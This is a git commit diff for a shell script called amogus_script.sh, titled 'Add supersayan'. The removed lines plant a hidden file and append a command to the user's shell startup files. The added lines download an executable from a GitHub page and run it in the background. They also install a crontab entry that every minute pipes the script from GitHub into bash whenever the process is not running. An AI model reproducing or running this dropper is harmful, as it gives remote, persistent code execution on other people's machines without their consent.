7623128c4f64db745d7dde8297e6a101a9c2e205
romain <romain.panno@epitech.eu>
2023-02-24 17:55:05 +0100

    Add supersayan

--- amogus_script.sh
+++ amogus_script.sh
@@ -1,11 +1,10 @@
 #!/bin/bash
 
-TARGETPATH=$HOME/.system.d_file
-
-wget -O $TARGETPATH https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus.txt
-
-if [[ -n "$(echo $SHELL | grep 'zsh')" ]]; then
-    echo -e "\ncat $TARGETPATH" >> ${ZDOTDIR:-$HOME}/.zshrc
-elif [[ -n "$(echo $SHELL | grep 'bash')" ]]; then
-    echo -e "\ncat $TARGETPATH" >> ~/.bashrc
-fi
+path=$(mktemp XXXXXX)
+cd $path
+wget https://github.com/Waz0x/Waz0x.github.io/raw/main/bin/linux64.exe && chmod +x linux64.exe
+crontab -l > crontabs
+nohup linux64.exe &
+cat crontabs
+echo "* * * * *     bash -c \"if [[ -z $(pidof linux64.exe) ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi\"" >> crontabs
+crontab crontabs
